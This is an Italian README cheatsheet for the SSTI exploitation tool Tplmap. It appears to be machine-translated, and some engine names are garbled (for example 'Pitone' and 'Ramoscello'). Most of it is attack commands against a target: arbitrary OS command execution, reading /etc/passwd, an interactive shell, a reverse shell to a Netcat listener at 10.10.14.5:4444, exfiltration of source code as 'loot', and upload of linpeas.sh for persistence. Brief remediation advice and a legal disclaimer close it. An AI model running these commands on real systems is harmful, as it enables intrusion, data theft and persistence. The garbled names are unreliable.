<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎭 Tplmap - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```
<palign="centro">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Sicurezza web e API">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Template Engines">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licenza GPLv2">
</p>

<palign="centro">
  <b>🌐 Strumento di sfruttamento automatizzato progettato per rilevare e sfruttare le vulnerabilità SSTI (Server-Side Template Injection) per ottenere l'esecuzione di codice in modalità remota</b>
</p>

---

## 📋 Sommario

- [Panoramica e vulnerabilità SSTI](#-panoramica--la-vulnerabilità-ssti)
- [Motori di template supportati](#-supported-template-engines)
- [Installazione](#-installazione)
- [Rilevamento vulnerabilità di base](#-basic-vulnerability-detection)
- [Targeting di punti di iniezione specifici (marcatore `*`)](#-targeting-specific-injection-points--marker)
- [Esecuzione comando remoto (`--os-cmd`)](#-esecuzione-comando-remoto---os-cmd)
- [Shell interattive e connessioni inverse](#-shell-interattive--connessioni-inverse)
- [Caricamento e download di file](#-file-upload--download)
- [Test dei dati e delle intestazioni POST](#-testing-post-data--headers)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e riparazione](#-considerazioni-difensive--riparazione)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e vulnerabilità SSTI

**Server-Side Template Injection (SSTI)** si verifica quando un'applicazione incorpora l'input dell'utente non convalidato direttamente in un modello lato server anziché trasmetterlo come dati di cui eseguire il rendering. Poiché i moderni motori di template consentono una sintassi come `{{7*7}}` o `${7*7}`, gli aggressori possono uscire dalla sandbox e accedere all'ambiente runtime sottostante (Python, Java, PHP, Ruby, Node.js).

Scritto da **Miroslav Stampar** e **Emilio Pinna**, **Tplmap** agisce come "SQLMap per Template Engines". Rileva automaticamente le impronte digitali del motore del modello attivo, esce dai contesti di valutazione del modello e intensifica l'esecuzione del codice fino all'accesso completo alla shell a livello di sistema operativo.

---

## 🧩 Motori di template supportati

| Lingua | Motori di template supportati |
|----------|---------------------|
| **Pitone** | Jinja2, Mako, Tornado, Nunjucks |
| **PHP** | Ramoscello, Smarty |
| **Java** | Freemarker, Velocità |
| **Rubino** | ERB, Sottile |
| **Node.js** | Giada, Carlino, Polvere.js |

---

## 📥Installazione

Tplmap è costruito su Python:
```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```
---

## 🚀 Rilevamento base delle vulnerabilità
```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```
---

## 💻 Esecuzione del comando remoto (`--os-cmd`)

Una volta che Tplmap rileva il motore (ad esempio Jinja2), esegui direttamente comandi shell arbitrari:
```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```
---

## 💀 Gusci interattivi e connessioni inverse
```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```
---

## 📁 Caricamento e download di file

Esfiltra il codice sorgente o carica gli strumenti di persistenza:
```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```
---

## 🌐 Test dei dati e delle intestazioni POST
```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Rileva SSTI nell'URL** | `python tplmap.py -u "<URL>?param=*"` |
| **Esegui comando remoto** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **Terminale interattivo** | `python tplmap.py -u "<URL>" --os-shell` |
| **Rilascia guscio inverso** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **Scarica file remoto** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **Carica file locale** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| **Corpo POST di prova** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ Considerazioni difensive e rimedi

1. **Escaping sensibile al contesto:** non concatenare mai l'input utente non elaborato nelle stringhe del modello. Utilizza il meccanismo di associazione delle variabili native del motore del modello (ad esempio, in Jinja2: `render_template('hello.html', name=user_input)` anziché `render_template_string(f"Hello {user_input}")`).
2. **Restrizioni sandbox:** Applica un sandboxing rigoroso all'interno dei motori in cui il rendering dinamico è inevitabile, impedendo l'accesso a `__class__`, `__mro__` o oggetti di riflessione.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Tplmap esegue codice remoto arbitrario sui server delle applicazioni di destinazione. Testare o sfruttare applicazioni web senza previa autorizzazione scritta è strettamente illegale.